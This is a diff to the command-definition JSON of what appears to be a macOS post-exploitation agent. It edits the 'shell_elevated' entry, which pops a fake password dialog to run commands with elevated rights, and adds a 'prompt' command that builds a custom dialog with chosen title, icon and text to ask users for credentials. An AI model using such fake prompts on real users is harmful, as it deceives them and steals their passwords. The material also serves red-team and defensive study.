@@ -26,7 +26,7 @@
         },
         {
           "cmd": "shell_elevated",
-          "description": "The command will use your prompt to pop a dialog box for the user asking for them to input their password so that the command you entered will be executed in an elevated context. Alternatively, you can supply a username and password and the command will run under their context (assuming they have the right permissions). From the UI, just type \"shell_elevated\" and you'll be prompted for the required paramters",
+          "description": "The command will use your prompt to pop a dialog box for the user asking for them to input their password so that the command you entered will be executed in an elevated context (prompt string is required in this case). Alternatively, you can supply a username and password and the command will run under their context (assuming they have the right permissions). From the UI, just type \"shell_elevated\" and you'll be prompted for the required paramters",
           "help_cmd": "From the GUI: shell_elevated. From RESTful interface: shell_elevated {\"command\":\"whoami\",\"prompt\":\"my fake prompt\", \"use_creds\": \"false\"}",
           "needs_admin": "false",
           "parameters": [
@@ -341,6 +341,38 @@
           "help_cmd": "jsimport_call Get_DomainUser({help=true});",
           "needs_admin": "false",
           "parameters": []
+        },
+        {
+          "cmd": "prompt",
+          "description": "Create a custom prompt to ask the user for credentials",
+          "help_cmd": "prompt with optional title, icon, text, default answer",
+          "needs_admin": "false",
+          "parameters": [
+            {
+              "name": "title",
+              "isString": "true",
+              "required": "false",
+              "hint": "Title of the dialog box"
+            },
+            {
+              "name": "icon",
+              "isString": "true",
+              "required": "false",
+              "hint": "full path to .icns file to use"
+            },
+            {
+              "name": "text",
+              "isString": "true",
+              "required": "false",
+              "hint": "Additional descriptive text to display"
+            },
+            {
+              "name": "answer",
+              "isString": "true",
+              "required": "false",
+              "hint": "Default answer to prepopulate (will show up as *****)"
+            }
+          ]
         }
       ]
     }
